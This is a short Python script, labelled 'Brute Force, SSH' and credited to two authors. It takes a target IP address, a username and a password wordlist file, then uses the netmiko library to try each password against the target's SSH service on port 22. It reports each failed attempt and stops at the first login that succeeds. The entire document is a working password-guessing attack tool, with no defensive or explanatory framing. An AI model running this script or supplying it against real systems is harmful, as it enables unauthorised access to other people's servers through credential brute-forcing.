#!/usr/bin/python3
# Nick Alderete & Andrew Perry 
# Brute Force, SSH


from netmiko import ConnectHandler

# Get user input
ip_address = input("Enter the IP address: ")
password_file = input("Enter the file path for the password file: ")
username = input("Enter the username: ")

# Read passwords from the file
with open(password_file, 'r') as file:
    passwords = file.readlines()
passwords = [password.strip() for password in passwords]

# SSH connection parameters
device = {
    'device_type': 'linux',
    'ip': ip_address,
    'username': username,
    'password': '',
    'port': 22,
}

# Establish SSH connection for each password
for password in passwords:
    device['password'] = password
    try:
        connection = ConnectHandler(**device)
        print(f"SSH connection successful with password: {password}")
        # Perform actions on the Linux server using the connection
        # For example, execute commands: connection.send_command('command')
        connection.disconnect()
        break  # Exit the loop if successful connection is established
    except Exception as e:
        print(f"SSH connection failed with password: {password}")
        
